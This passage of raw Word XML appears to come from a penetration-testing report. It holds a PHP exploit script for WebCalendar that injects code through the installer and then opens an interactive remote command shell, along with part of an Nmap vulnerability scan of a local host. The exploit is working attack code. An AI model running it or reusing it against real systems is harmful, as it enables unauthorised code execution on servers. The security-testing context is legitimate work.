        <w:t>$host, $path) = array($argv[1], $argv[2]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E47CDA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49967490"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$phpcode = "*/print(____</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>);passthru</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(base64_decode(\$_SERVER[HTTP_CMD]));die;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C028916"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$payload = "app_settings=1&amp;form_user_inc=user.php&amp;form_single_user_login={$phpcode}";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7851E37C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78910BB9"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet  =</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "POST {$path}install/index.php HTTP/1.0\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7BA5D3"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Host: {$host}\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759585F6"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Content-Length: ".strlen($payload)."\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04412761"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Content-Type: application/x-www-form-urlencoded\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52907533"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Connection: close\r\n\r\n{$payload}";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AED11E1"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D38AE0"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http_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>send(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$host, $packet);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25839EAD" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="456B0A85"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet  =</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "GET {$path}includes/settings.php HTTP/1.0\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367F6895"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Host: {$host}\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DBF4EB"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Cmd: %s\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214FBE94"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>packet .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>= "Connection: close\r\n\r\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4EFA20" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FDE669A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42131F00"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729922FB"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 xml:space="preserve">    print "\nwebcalendar-shell# ";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DFEB2B"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 xml:space="preserve">    if (($cmd = trim(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fgets(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>STDIN))) == "exit") break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644DD7B7"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    $response = http_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>send(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$host, sprintf($packet, base64_encode($cmd)));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19597481" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRP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 xml:space="preserve">    preg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>match(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'/____(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D7375B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36736444" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc27518416"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix B</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="03DA661D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C8C1F1B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002152BC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NMAP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> TCP SCREENSHOT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56922DF7" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40FA50F2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4DB2D3FC" wp14:editId="607B50F9">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3895"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E002330" w14:textId="77777777" w:rsidR="002152BC" w:rsidRPr="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4652C905" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F6A3D3" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F7BBC8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc27518417"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="7AEBB14F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EFE12BE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRPr="007077E7" w:rsidRDefault="007077E7" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Nmap vulnerability scan ran against 192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3421E45B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13424F07" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>root@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>kali:~</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t># nmap --script vuln 192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DE7C75" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">Starting Nmap 7.80 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>( https://nmap.org</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> ) at 2019-11-29 05:44 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F598831" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Stats: 0:02:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CAAB06" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>NSE Timing: About 95.91% done; ETC: 05:47 (0:00:06 remaining)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020FDC53" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35841925" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Host is up (0.00032s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C574BD" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Not shown: 973 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1C4E66" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>PORT      STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F893CC" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">23/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  telnet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="584AAC6F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C6086C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">25/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  smtp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
